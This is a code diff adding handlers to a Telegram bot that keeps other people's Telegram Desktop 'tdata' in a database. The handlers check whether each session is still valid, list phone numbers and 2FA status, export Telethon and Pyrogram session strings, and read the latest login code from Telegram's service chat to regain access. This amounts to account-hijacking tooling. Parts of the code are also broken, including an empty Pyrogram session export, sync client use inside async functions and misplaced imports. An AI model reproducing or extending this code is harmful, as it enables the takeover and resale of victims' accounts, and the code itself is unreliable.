@@ -108,3 +108,147 @@ async def handle_zip(client, message):
     await message.reply_document(result_txt, caption="📄 Accounts Report")
 
     shutil.rmtree(temp_dir)
+
+
+async def check_valid_session(tdata_bytes):
+    """Check if a stored tdata is still valid."""
+    temp_dir = tempfile.mkdtemp()
+    tdata_path = os.path.join(temp_dir, "tdata.zip")
+
+    with open(tdata_path, "wb") as f:
+        f.write(base64.b64decode(tdata_bytes))
+
+    # Extract
+    extract_dir = os.path.join(temp_dir, "tdata")
+    with zipfile.ZipFile(tdata_path, "r") as zip_ref:
+        zip_ref.extractall(extract_dir)
+
+    try:
+        from tdata_converter import convert_tdata
+        session = convert_tdata(extract_dir, API_ID, API_HASH)
+        with TelegramClient(session, API_ID, API_HASH) as client:
+            if client.is_user_authorized():
+                me = client.get_me()
+                return True, me, session
+            else:
+                return False, None, None
+    except Exception:
+        return False, None, None
+    finally:
+        shutil.rmtree(temp_dir)
+
+
+@Client.on_message(filters.command("retrieve") & filters.private)
+async def retrieve_account(client, message):
+    if len(message.command) < 2:
+        return await message.reply("⚠️ Usage: `/retrieve user_id`", quote=True)
+
+    user_id = int(message.command[1])
+    doc = await db.col.find_one({"_id": user_id})
+    if not doc:
+        return await message.reply("❌ Account not found in database.")
+
+    # Check validity
+    valid, me, session = await check_valid_session(doc["tdata"])
+    status = "✅ Valid" if valid else "❌ Invalid"
+
+    text = (
+        f"📂 Account Info\n"
+        f"User ID: {user_id}\n"
+        f"Name: {doc['name']}\n"
+        f"Phone: {doc['phone']}\n"
+        f"2FA: {doc['twofa']}\n"
+        f"Spam: {doc['spam']}\n"
+        f"Status: {status}"
+    )
+
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("📄 Session Tele", callback_data=f"tele_{user_id}")],
+        [InlineKeyboardButton("📄 Session Py", callback_data=f"py_{user_id}")],
+        [InlineKeyboardButton("📱 By Phone", callback_data=f"phone_{user_id}")]
+    ])
+
+    await message.reply(text, reply_markup=keyboard)
+
+
+@Client.on_callback_query(filters.regex(r"^(tele|py|phone)_(\d+)$"))
+async def retrieve_options(client, callback_query):
+    action, uid = callback_query.data.split("_")
+    uid = int(uid)
+
+    doc = await db.col.find_one({"_id": uid})
+    if not doc:
+        return await callback_query.message.edit("❌ Account not found.")
+
+    valid, me, session = await check_valid_session(doc["tdata"])
+    if not valid:
+        return await callback_query.message.edit("❌ Session expired / invalid.")
+
+    if action == "tele":
+        string = session.save()
+        txt = io.StringIO(string)
+        txt.name = f"{uid}_tele_session.txt"
+        await callback_query.message.reply_document(txt, caption="🔑 Telethon Session")
+    elif action == "py":
+        from pyrogram import Client as PyroClient
+        from pyrogram.sessions import StringSession as PyroSession
+        pyro_string = PyroSession().save()
+        txt = io.StringIO(pyro_string)
+        txt.name = f"{uid}_pyrogram_session.txt"
+        await callback_query.message.reply_document(txt, caption="🔑 Pyrogram Session")
+    elif action == "phone":
+        phone = doc["phone"]
+        await callback_query.message.reply(
+            f"📱 Phone number: `{phone}`\n\nClick **Get Code** after sending code to this number.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📩 Get Code", callback_data=f"getcode_{uid}")]
+            ])
+        )
+
+
+
+import re
+import tempfile, zipfile, shutil, os, base64
+from telethon import TelegramClient
+from tdata_converter import convert_tdata
+
+
+@Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
+async def get_code(client, callback_query):
+    uid = int(callback_query.data.split("_")[1])
+    doc = await db.col.find_one({"_id": uid})
+    if not doc:
+        return await callback_query.message.edit("❌ Account not found.")
+
+    # Prepare tdata temp folder
+    temp_dir = tempfile.mkdtemp()
+    tdata_zip = os.path.join(temp_dir, "tdata.zip")
+    with open(tdata_zip, "wb") as f:
+        f.write(base64.b64decode(doc["tdata"]))
+
+    extract_dir = os.path.join(temp_dir, "tdata")
+    with zipfile.ZipFile(tdata_zip, "r") as zip_ref:
+        zip_ref.extractall(extract_dir)
+
+    try:
+        # Convert tdata → Telethon session
+        session = convert_tdata(extract_dir, API_ID, API_HASH)
+
+        async with TelegramClient(session, API_ID, API_HASH) as tele:
+            # Get last message from official Telegram (777000)
+            msgs = await tele.get_messages(777000, limit=1)
+            if not msgs:
+                return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)
+
+            text = msgs[0].message
+            match = re.search(r"Login code[:\s]+(\d{5})", text)
+            if match:
+                code = match.group(1)
+                await callback_query.answer(f"📩 Your login code is: {code}", show_alert=True)
+            else:
+                await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)
+
+    except Exception as e:
+        await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
+    finally:
+        shutil.rmtree(temp_dir)
